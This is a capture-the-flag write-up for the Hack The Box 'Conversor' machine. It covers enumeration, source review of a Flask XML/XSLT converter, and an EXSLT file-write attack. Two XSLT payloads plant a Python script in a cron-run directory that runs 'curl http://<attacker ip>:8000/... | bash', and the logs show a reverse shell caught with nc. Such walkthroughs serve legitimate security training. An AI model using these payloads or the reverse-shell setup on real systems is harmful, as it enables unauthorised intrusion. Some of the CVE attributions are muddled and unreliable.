# ConverserHTB
Writeup of the Converser seasonal HTB machine. 

**replace all formatting with `<attacker ip>` in the files**

Intial NMAP scan and analysis of the machine brings up 2 seperate PoA including SSH and a webserver hosted on 80
```
nmap -sV -sC 10.10.11.92
```
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-30 12:30 CDT
Nmap scan report for conversor.htb (10.10.11.92)
Host is up (0.027s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-title: Login
|_Requested resource was /login
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.21 seconds
```

After creating an account and installing the source_code tarball we can see a few files and subdirectories most of which are useless besides two `app.py` and `install.md`

```
┌──(root㉿kali)-[/home/kali/Downloads/source_code]
└─# cat app.py

from flask import Flask, render_template, request, redirect, url_for, session, send_from_directory
import os, sqlite3, hashlib, uuid

app = Flask(__name__)
app.secret_key = 'Changemeplease'

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = '/var/www/conversor.htb/instance/users.db'
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def init_db():
    os.makedirs(os.path.join(BASE_DIR, 'instance'), exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS files (
        id TEXT PRIMARY KEY,
        user_id INTEGER,
        filename TEXT,
        FOREIGN KEY(user_id) REFERENCES users(id)
    )''')
    conn.commit()
    conn.close()

init_db()

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

@app.route('/')
def index():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM files WHERE user_id=?", (session['user_id'],))
    files = cur.fetchall()
    conn.close()
    return render_template('index.html', files=files)

@app.route('/register', methods=['GET','POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        conn = get_db()
        try:
            conn.execute("INSERT INTO users (username,password) VALUES (?,?)", (username,password))
            conn.commit()
            conn.close()
            return redirect(url_for('login'))
        except sqlite3.IntegrityError:
            conn.close()
            return "Username already exists"
    return render_template('register.html')
@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))


@app.route('/about')
def about():
 return render_template('about.html')

@app.route('/login', methods=['GET','POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT * FROM users WHERE username=? AND password=?", (username,password))
        user = cur.fetchone()
        conn.close()
        if user:
            session['user_id'] = user['id']
            session['username'] = username
            return redirect(url_for('index'))
        else:
            return "Invalid credentials"
    return render_template('login.html')


@app.route('/convert', methods=['POST'])
def convert():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    from lxml import etree
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)
    try:
        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
        xml_tree = etree.parse(xml_path, parser)
        xslt_tree = etree.parse(xslt_path)
        transform = etree.XSLT(xslt_tree)
        result_tree = transform(xml_tree)
        result_html = str(result_tree)
        file_id = str(uuid.uuid4())
        filename = f"{file_id}.html"
        html_path = os.path.join(UPLOAD_FOLDER, filename)
        with open(html_path, "w") as f:
            f.write(result_html)
        conn = get_db()
        conn.execute("INSERT INTO files (id,user_id,filename) VALUES (?,?,?)", (file_id, session['user_id'], filename))
        conn.commit()
        conn.close()
        return redirect(url_for('index'))
    except Exception as e:
        return f"Error: {e}"

@app.route('/view/<file_id>')
def view_file(file_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM files WHERE id=? AND user_id=?", (file_id, session['user_id']))
    file = cur.fetchone()
    conn.close()
    if file:
        return send_from_directory(UPLOAD_FOLDER, file['filename'])
    return "File not found"
```

This file gives us some clues as to where to go for next steps. We see the upload portion is XML and XSLT files which could contain RCE or Reverse shell capabilities. Further enumeration of the code there is a specific portion that catches attention in the `convert()` function:

```
try:
    parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
    xml_tree = etree.parse(xml_path, parser)
    xslt_tree = etree.parse(xslt_path)
    transform = etree.XSLT(xslt_tree)
    result_tree = transform(xml_tree)
    result_html = str(result_tree)
    file_id = str(uuid.uuid4())
    filename = f"{file_id}.html"
    html_path = os.path.join(UPLOAD_FOLDER, filename)
    with open(html_path, "w") as f:
        f.write(result_html)
    conn = get_db()
    conn.execute("INSERT INTO files (id,user_id,filename) VALUES (?,?,?)", (file_id, session['user_id'], filename))
    conn.commit()
    conn.close()
    return redirect(url_for('index'))
except Exception as e:
    return f"Error: {e}"
```
The `xml_tree` & `xslt_tree` variables call the `etree.parse()` function with the `xml_path` variable within its parameters. Parsing errors are incredibly common and can be huge vulnerabilities if improperly implemented. In our case it is exactly that; user-supplied XSLT is parsed and executed server side meaning arbitrary code put within an `.xml` or `.xslt` file could be used maliciously.

In this case transformation output is written to the disk and served. When the result of the transform is served, it comes as a `.html` file. So anything the XSLT outputs becomes visible to whoever fetches that HTML. The other more intutive route would be utilizing CVE-2023-46214. Both these attack vectors utilize CVE-2025-6985 and CVE-2023-46214. Read more here: [CVE-2025-6985](https://nvd.nist.gov/vuln/detail/CVE-2025-6985) [CVE-2023-46214](https://nvd.nist.gov/vuln/detail/cve-2023-46214)

The XSLT parsing bug works but looking over the rest of the files in the source code there is one more important piece of information located in the `install.md` file.

```
If you want to run Python scripts (for example, our server deletes all files old...)
***** www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f" ""
```

This is our way in. The file tells us that its executing a **cron job**. Read more here: [Cron Kubernetes](https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/). Its specifying that it runs as `www-data`, executing any `.py` file within the `/var/www/conversor.htb/scripts/` directory on the server, particularily every 60 seconds.

We use this to our advantage. Since the user portal allows us to upload `.xml` and `.xlst` files, executing them respectfully thanks to the parsing error, we can find a way to RCE a python file to the `/scripts` directory and maintain a reverse shell.

First steps is to build the shell script, XML dummy file, and Python & XLST RCE file. All of which are attatched.

I wont go into why and what makes this vulnerability work, if you want to read more check out this great analysis on the CVE. [Splunk and EXSLT CVE](https://www.uptycs.com/blog/threat-research-report-team/splunk-vulnerability-cve-2023-46214)

In order to make it the most effecient we combine processes into one singular upload.

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:shell="http://exslt.org/common"
    extension-element-prefixes="shell">

    <xsl:template match="/">
        <shell:document href="/var/www/conversor.htb/scripts/Rshell.py" method="text">
import os
os.system("curl http://<your attacker ip>:8000/<directory your .sh file is in> | bash")
        </shell:document>
    </xsl:template>

</xsl:stylesheet>
```

This version of EXSLT supports 2 seperate namespaces of exporting text to an uploaded document `exsl:document` or `shell:document`. 

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
  <xsl:template match="/">
    <exsl:document href="/var/www/conversor.htb/scripts/Rshell.py" method="text">
        <xsl:text>
        import os
        os.system("curl http://<your attacker ip>:8000/<directory your .sh file is in> | bash")
        </xsl:text>
    </exsl:document>
  </xsl:template>
</xsl:stylesheet>
```

Either one of these would work assuming that the `install.md` file is correct in saying the `www-data` user has write permissions to the `/var/../../scripts` directory.

Before uploading our our `.xml` and `.xslt` files we need to establish a way for the files to pull our shell.sh file from our attacker machine. We need to setup a python http server and a nc listener on our attacker machine and then upload our arbitrary files. After doing so and waiting 60 seconds we can see it works.

```
┌──(root㉿kali)-[/]
└─# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.92 - - [31/Oct/2025 10:47:58] "GET /shell.sh HTTP/1.1" 200 -


┌──(root㉿kali)-[/]
└─# rlwrap nc -lvnp 9001 
listening on [any] 9001 ...
connect to [<attacker ip>] from (UNKNOWN) [10.10.11.92] 35994
bash: cannot set terminal process group (94832): Inappropriate ioctl for device
bash: no job control in this shell
www-data@conversor:~$

```


